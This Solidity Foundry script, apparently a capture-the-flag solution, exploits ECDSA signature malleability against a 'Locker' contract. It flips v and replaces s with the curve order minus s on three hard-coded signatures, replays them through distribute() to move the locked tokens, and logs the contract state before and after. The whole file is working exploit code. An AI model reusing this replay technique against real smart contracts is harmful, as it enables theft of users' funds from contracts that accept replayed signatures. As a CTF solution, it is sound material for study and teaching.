// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "src/Locker.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract Exploit is Script {
    address public constant SETUP_ADDRESS =
        0xd50E8B19610A788161b4aaaC7A2A646d19972a26;

    address public constant LOCKER_ADDRESS =
        0x0A99C0Ccf4c51081b0F4dFdC633136b5551E0166;

    SetupLocker public setupLocker;
    Locker public locker;

    constructor() {
        setupLocker = SetupLocker(SETUP_ADDRESS);
        locker = Locker(LOCKER_ADDRESS);
    }

    function run() public returns (bool) {
        signature[] memory signatures = new signature[](3);
        (uint8 v1, bytes32 r1, bytes32 s1) = malleateSignature(
            27,
            0x36ade3c84a9768d762f611fbba09f0f678c55cd73a734b330a9602b7426b18d9,
            0x6f326347e65ae8b25830beee7f3a4374f535a8f6eedb5221efba0f17eceea9a9
        );
        (uint8 v2, bytes32 r2, bytes32 s2) = malleateSignature(
            28,
            0x57f4f9e4f2ef7280c23b31c0360384113bc7aa130073c43bb8ff83d4804bd2a7,
            0x694430205a6b625cc8506e945208ad32bec94583bf4ec116598708f3b65e4910
        );
        (uint8 v3, bytes32 r3, bytes32 s3) = malleateSignature(
            27,
            0xe2e9d4367932529bf0c5c814942d2ff9ae3b5270a240be64b89f839cd4c78d5d,
            0x6c0c845b7a88f5a2396d7f75b536ad577bbdb27ea8c03769a958b2a9d67117d2
        );
        signatures[0] = signature({v: v1, r: r1, s: s1});
        signatures[1] = signature({v: v2, r: r2, s: s2});
        signatures[2] = signature({v: v3, r: r3, s: s3});

        console.log("=======================Before Distribute=======================");
        console.log("token count in Locker contract: ", locker.tokens());
        console.log("IsSolved() function in Locker contract: ", locker.isSolved());
        console.log("challenge address in setupLocker contract: ", setupLocker.challenge());
        console.log("IsSolved() function in setupLocker contract: ", setupLocker.isSolved());
        vm.startBroadcast();
        locker.distribute(signatures);
        console.log("=======================After Distribute=======================");
        console.log("token count in Locker contract: ", locker.tokens());
        console.log("IsSolved() function in Locker contract: ", locker.isSolved());
        console.log("challenge address in setupLocker contract: ", setupLocker.challenge());
        console.log("IsSolved() function in setupLocker contract: ", setupLocker.isSolved());
        vm.stopBroadcast();
        return locker.isSolved();
    }

    uint256 constant SECP256K1N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function malleateSignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public pure returns (uint8, bytes32, bytes32) {
        uint8 vPrime = v == 27 ? 28 : 27;
        uint256 sInt = uint256(s);
        require(sInt <= SECP256K1N, "Invalid s value");
        uint256 sPrimeInt = SECP256K1N - sInt;
        bytes32 sPrime = bytes32(sPrimeInt);
        return (vPrime, r, sPrime);
    }
}
